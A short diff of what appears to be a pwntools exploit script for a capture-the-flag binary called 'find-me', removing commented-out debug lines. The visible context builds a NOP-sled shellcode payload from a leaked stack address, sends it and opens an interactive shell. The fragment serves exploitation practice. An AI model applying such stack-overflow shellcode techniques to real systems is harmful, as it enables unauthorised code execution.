@@ -4,11 +4,6 @@ import re
 PROGRAM_PATH = (Path(__file__).parent / "find-me").resolve().__str__()
 BIG_BUFF_SIZE = 256
 FD = 1000
-# BUFF_SIZE = 0x88
-# CANARY = 123456789
-# This shell code is 23 bytes
-# b *main+1006
-#
 
 gdb_script = """
 b *main
@@ -79,17 +74,8 @@ print(f"stack address received: {stck_addr}")
 stack_addr_int = int(stck_addr, 16)
 
 
-# print("____________________________________")
-# Get the stack address
-# res = io.recvlines(2)
-# print(res)
-
-
-# le = p64(int(CANARY, 16), "little")
-# be = p64(int(CANARY, 16), endianness="big")
 NOP = b"\x90"
 Signature = 8 * b"\x90"
-# This works
 BigPayload = NOP * (16 - BigShellCodeLen % 16 + len(Signature)) + BigShellCode
 
 # THIS WORKS
@@ -166,7 +152,3 @@ io.sendline(BigPayload)
 
 
 io.interactive()
-
-# io.sendline(10 * NOP)
-# res = io.recvline().decode("ascii")
-# print(res)
